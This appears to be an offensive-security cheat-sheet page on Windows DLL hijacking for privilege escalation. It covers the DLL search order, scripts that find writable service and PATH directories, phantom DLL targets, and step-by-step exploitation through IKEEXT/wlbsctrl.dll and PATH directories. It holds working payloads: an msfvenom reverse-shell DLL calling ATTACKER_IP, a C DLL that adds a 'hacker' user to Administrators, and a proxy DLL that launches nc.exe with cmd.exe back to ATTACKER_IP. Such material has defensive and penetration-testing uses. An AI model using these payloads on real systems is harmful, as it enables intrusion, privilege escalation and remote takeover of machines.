---
title: 'DLL Hijacking'
description: 'Windows DLL hijacking techniques for privilege escalation — search order abuse, missing DLL exploitation, phantom DLL hijacking, and DLL proxying.'
---

# DLL Hijacking

## How It Works

When a Windows application loads a DLL without specifying the full path, the OS searches directories in a specific order. If you can place a malicious DLL in a directory that's searched **before** the legitimate DLL's location, your DLL gets loaded instead.

### Windows DLL Search Order

When `SafeDllSearchMode` is enabled (default):

| Order | Directory | Typically Writable? |
|:------|:---------|:-------------------|
| 1 | Directory of the application (.exe) | Sometimes ✅ |
| 2 | `C:\Windows\System32` | No ❌ |
| 3 | `C:\Windows\System` (16-bit legacy) | No ❌ |
| 4 | `C:\Windows` | No ❌ |
| 5 | Current working directory (CWD) | Sometimes ✅ |
| 6 | Directories in `%PATH%` | **Often ✅** |

---

## Finding DLL Hijacking Opportunities

### Method 1: ProcMon (Process Monitor)

The most reliable method. Captures real-time DLL load attempts.

1. Launch ProcMon and set these filters:
   - **Operation** is `CreateFile` → Include
   - **Result** is `NAME NOT FOUND` → Include
   - **Path** ends with `.dll` → Include
2. Start/restart the target service or application
3. Look for DLL loads attempted from **writable directories**

### Method 2: Automated Discovery

```powershell
# Find services with executables in writable directories
Get-WmiObject win32_service | Where-Object {$_.State -eq 'Running'} | ForEach-Object {
    $path = ($_.PathName -replace '"','').Split(' ')[0]
    $dir = Split-Path $path
    if (Test-Path $dir) {
        $acl = Get-Acl $dir
        if ($acl.AccessToString -match 'Users.*Write|Everyone.*Write|BUILTIN.*Modify') {
            Write-Host "[!] Writable service directory: $dir (Service: $($_.Name))" -ForegroundColor Red
        }
    }
}
```

### Method 3: Check PATH Directories

```cmd
:: Display PATH
echo %PATH%

:: Check write permissions on each PATH directory
for %A in ("%path:;=" "%") do @(icacls %A 2>nul | findstr /i "Users Everyone BUILTIN" | findstr /i "W F M" && echo === %A ===)
```

---

## Types of DLL Hijacking

### 1. Missing DLL Hijack

A service tries to load a DLL that **doesn't exist anywhere**. Place your DLL where it searches.

```cmd
:: ProcMon shows: C:\App\missing.dll → NAME NOT FOUND
:: Check if C:\App\ is writable
icacls "C:\App\"

:: Place your DLL there
copy evil.dll "C:\App\missing.dll"
```

### 2. Search Order Hijack

The legitimate DLL exists in `System32`, but you can place a copy in a directory searched earlier (like the application directory or a `%PATH%` directory).

### 3. Phantom DLL Hijack

The application references a DLL that was removed in a Windows update or never existed on the target OS version.

### Common Phantom DLLs

| DLL Name | Loaded By | Notes |
|:---------|:---------|:------|
| `wlbsctrl.dll` | `IKEEXT` service | Classic target, often missing |
| `TSMSISrv.dll` | Various services | Missing on some Windows versions |
| `TSVIPSrv.dll` | Terminal Services | Missing on non-RDS systems |
| `SprintCSP.dll` | `StorSvc` service | Used in LocalPotato chain |

---

## Creating a Malicious DLL

### Option 1: msfvenom

```bash
# Reverse shell DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o evil.dll
```

### Option 2: Custom C DLL (Cross-compile on Linux)

```c
// payload.c — Executes command when DLL is loaded
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason, LPVOID lpReserved) {
    if (ul_reason == DLL_PROCESS_ATTACH) {
        system("cmd /c net localgroup Administrators hacker /add");
    }
    return TRUE;
}
```

```bash
# Compile for 64-bit
x86_64-w64-mingw32-gcc payload.c -shared -o evil.dll

# Compile for 32-bit
i686-w64-mingw32-gcc payload.c -shared -o evil.dll
```

!!! warning "Architecture Matters"
    Match the DLL architecture (32-bit vs 64-bit) to the process loading it. A 64-bit process cannot load a 32-bit DLL and vice versa.

### Option 3: DLL Proxying (Stealth)

To avoid breaking the application, create a DLL that:
1. Executes your payload
2. Forwards all function calls to the original DLL

```c
// proxy.c — Run payload AND forward to original DLL
#include <windows.h>

// Forward exports to original DLL
#pragma comment(linker, "/export:OriginalFunction=original.OriginalFunction")

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason, LPVOID lpReserved) {
    if (ul_reason == DLL_PROCESS_ATTACH) {
        // Run payload in background thread to avoid blocking
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)system,
                     "cmd /c C:\\temp\\nc.exe ATTACKER_IP 4444 -e cmd.exe", 0, NULL);
    }
    return TRUE;
}
```

Use [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) to auto-generate proxy DLLs.

---

## Exploitation — IKEEXT + wlbsctrl.dll (Classic)

The `IKEEXT` (IKE and AuthIP IPsec Keying Modules) service tries to load `wlbsctrl.dll`, which often doesn't exist.

```cmd
:: Step 1: Verify IKEEXT exists and check its status
sc qc IKEEXT

:: Step 2: Check if wlbsctrl.dll is missing
dir C:\Windows\System32\wlbsctrl.dll
:: If "File Not Found" → exploitable

:: Step 3: Place your DLL (requires write access to System32 — needs SeManageVolume or SeRestore)
copy evil.dll C:\Windows\System32\wlbsctrl.dll

:: Step 4: Restart the service
sc stop IKEEXT
sc start IKEEXT
```

---

## Exploitation — PATH Directory Hijack

```cmd
:: Step 1: Find writable directories in PATH
echo %PATH%
icacls "C:\Python27\"    :: Often writable by Users

:: Step 2: Identify what DLLs a service tries to load from PATH directories
:: (Use ProcMon with CreateFile + NAME NOT FOUND filter)

:: Step 3: Place your DLL in the writable PATH directory
copy evil.dll "C:\Python27\target.dll"

:: Step 4: Restart the service or wait for it to reload
```
